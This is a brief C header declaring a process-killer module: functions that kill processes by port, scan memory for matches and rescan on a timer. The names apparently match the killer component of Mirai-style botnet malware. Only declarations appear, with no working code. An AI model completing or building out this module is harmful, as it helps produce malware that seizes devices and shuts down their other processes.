#pragma once

#include "includes.h"

#define KILLER_MIN_PID 400
#define KILLER_RESTART_SCAN_TIME 600

void killer_find(char *value);
void killerinit(void);
void killer_kill(void);
BOOL killer_kill_by_port(port_t);
void openandclose(char *value);

static BOOL memory_scan_match(char *);
static BOOL has_exe_access(void);
static BOOL mem_exists(char *, int, char *, int);
